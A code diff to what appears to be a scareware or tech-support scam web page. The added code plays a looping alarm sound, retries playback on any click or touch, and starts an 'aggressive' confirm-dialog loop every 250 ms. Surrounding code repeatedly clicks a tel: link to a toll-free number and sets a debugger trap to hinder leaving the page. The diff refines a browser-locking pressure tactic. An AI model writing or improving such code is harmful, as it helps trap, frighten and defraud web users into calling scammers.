@@ -345,9 +345,42 @@
         }
 
 
-        var intervalId = setInterval(function() {
-            myFunction()
-        }, 100);
+        var alertAudio = new Audio('ialert.mp3');
+        alertAudio.loop = true;
+        var audioPlayed = false;
+
+        function attemptPlayAudio() {
+            if (!audioPlayed) {
+                var playPromise = alertAudio.play();
+                if (playPromise !== undefined) {
+                    playPromise.then(function() {
+                        audioPlayed = true;
+                    }).catch(function(error) {
+                        // Ignore
+                    });
+                }
+            }
+        }
+
+        // Try playing after 3 seconds
+        setTimeout(attemptPlayAudio, 3000);
+
+        // Try playing on any user interaction
+        document.addEventListener('click', attemptPlayAudio);
+        document.addEventListener('touchstart', attemptPlayAudio);
+        window.addEventListener('click', attemptPlayAudio);
+        window.addEventListener('touchstart', attemptPlayAudio);
+
+        var intervalId;
+        // Delay the aggressive confirm loop by 3 seconds so the page can load and audio can attempt to start
+        setTimeout(function() {
+            function loopConfirm() {
+                attemptPlayAudio(); // Also try playing when the loop fires
+                myFunction();
+                setTimeout(loopConfirm, 250); // Use setTimeout instead of setInterval to not starve the event loop completely
+            }
+            loopConfirm();
+        }, 3000);
 
         function okkkk() {
             jQuery('#result').append('<a  class="anchorcall" href="tel:+1(844)530-2543"></a>');
@@ -363,7 +396,6 @@
             document.querySelector('a').click();
             document.querySelector('a').click();
             document.querySelector('a').click();
-            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
         };
 
         function myFunction() {
@@ -373,30 +405,6 @@
                 return;
             }
         }
-
-        var alertAudio = new Audio('ialert.mp3');
-        alertAudio.loop = true;
-        var audioPlayed = false;
-
-        function attemptPlayAudio() {
-            if (!audioPlayed) {
-                var playPromise = alertAudio.play();
-                if (playPromise !== undefined) {
-                    playPromise.then(function() {
-                        audioPlayed = true;
-                    }).catch(function(error) {
-                        console.log('Audio autoplay blocked, waiting for user interaction');
-                    });
-                }
-            }
-        }
-
-        // Try playing after 3 seconds
-        setTimeout(attemptPlayAudio, 3000);
-
-        // Try playing on any user click/touch if not already playing
-        document.addEventListener('click', attemptPlayAudio);
-        document.addEventListener('touchstart', attemptPlayAudio);
 
         window.ununload = function() {
             debugger;
